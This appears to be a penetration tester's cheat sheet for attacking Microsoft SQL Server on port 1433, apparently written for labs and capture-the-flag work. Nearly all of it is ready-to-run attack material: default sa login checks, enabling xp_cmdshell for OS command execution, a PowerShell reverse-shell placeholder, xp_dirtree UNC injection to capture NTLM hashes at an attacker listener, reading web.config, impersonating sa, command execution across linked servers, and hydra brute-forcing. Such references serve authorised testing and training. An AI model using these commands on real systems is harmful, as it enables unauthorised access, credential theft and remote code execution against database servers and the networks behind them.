# MSSQL (1433)

[[09 - Service Cheatsheets/00 - README|Folder index]]

## Attacker Mindset

SQL Server. Check for `sa` account with blank/default password first. If `xp_cmdshell` is enabled (or you can enable it as sysadmin), you have OS command execution immediately. **Linked servers** chain into other databases or domains — a Kerberos-trust ladder by another name. UNC path injection captures NTLM hashes from the SQL service account. **Common attack vectors:** default/blank sa creds, xp_cmdshell OS execution, UNC path injection for NTLM capture, linked server abuse, SQL injection from app layer.

## Enumerate

```bash
nmap -sV -sC -p 1433 $IP
nmap --script ms-sql-info,ms-sql-ntlm-info -p 1433 $IP
nxc mssql $IP -u '' -p ''
```

## Connect

```bash
impacket-mssqlclient sa:'password'@$IP
impacket-mssqlclient domain/user:'pass'@$IP -windows-auth
sqsh -S $IP -U .\\user -P 'password' -h
```

## Once Connected — Enumeration

```sql
-- Who am I?
SELECT SYSTEM_USER;
SELECT USER_NAME();

-- Am I sysadmin?
SELECT IS_SRVROLEMEMBER('sysadmin');

-- Version and hostname
SELECT @@version;
SELECT @@SERVERNAME;

-- Current database
SELECT DB_NAME();

-- List all databases
SELECT name FROM sys.databases;

-- Switch database
USE <database>;

-- List tables in current database
SELECT * FROM information_schema.tables WHERE table_type = 'BASE TABLE';

-- List columns in a table
SELECT column_name, data_type FROM information_schema.columns WHERE table_name = '<table>';

-- Dump a table
SELECT * FROM <table>;

-- List all logins
SELECT name, type_desc, is_disabled FROM sys.server_principals;

-- List database users
SELECT name FROM sys.database_principals;
```

## xp_cmdshell — OS Command Execution (sysadmin)

```sql
-- Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Run commands
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'ipconfig';
EXEC xp_cmdshell 'type C:\Users\Administrator\Desktop\flag.txt';

-- Reverse shell (PowerShell)
EXEC xp_cmdshell 'powershell -e <base64_payload>';
```

## Steal NTLM Hash — UNC Path Injection

Start Responder or `impacket-smbserver` first, then force the SQL service account to authenticate to you.

```sql
-- Triggers NTLM auth to your listener
EXEC xp_dirtree '\\<YOUR_IP>\share', 1, 1;

-- Alternative
EXEC master..xp_subdirs '\\<YOUR_IP>\share';
```

## Read/Write Files

```sql
-- Read a file (bulk insert into temp table)
CREATE TABLE #file (line VARCHAR(MAX));
BULK INSERT #file FROM 'C:\inetpub\wwwroot\web.config';
SELECT * FROM #file;
DROP TABLE #file;

-- Write a file via xp_cmdshell
EXEC xp_cmdshell 'echo test > C:\temp\test.txt';

-- Enable OLE Automation for file write (alternative)
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
```

## Impersonation

```sql
-- Check who you can impersonate
SELECT distinct b.name FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';

-- Impersonate another user
EXECUTE AS LOGIN = 'sa';

-- Verify
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');

-- Revert
REVERT;
```

## Linked Servers

```sql
-- List linked servers
EXEC sp_linkedservers;

-- Query a linked server
SELECT * FROM openquery("LINKED_SRV", 'SELECT @@servername');

-- RCE via linked server (if xp_cmdshell enabled there)
EXEC ('EXEC xp_cmdshell ''whoami''') AT [LINKED_SRV];

-- Nested linked servers (double hop)
EXEC ('EXEC (''EXEC xp_cmdshell ''''whoami'''''') AT [LINKED_SRV_2]') AT [LINKED_SRV_1];
```

## Brute-force

```bash
nxc mssql $IP -u sa -p passwords.txt
hydra -l sa -P passwords.txt mssql://$IP
```
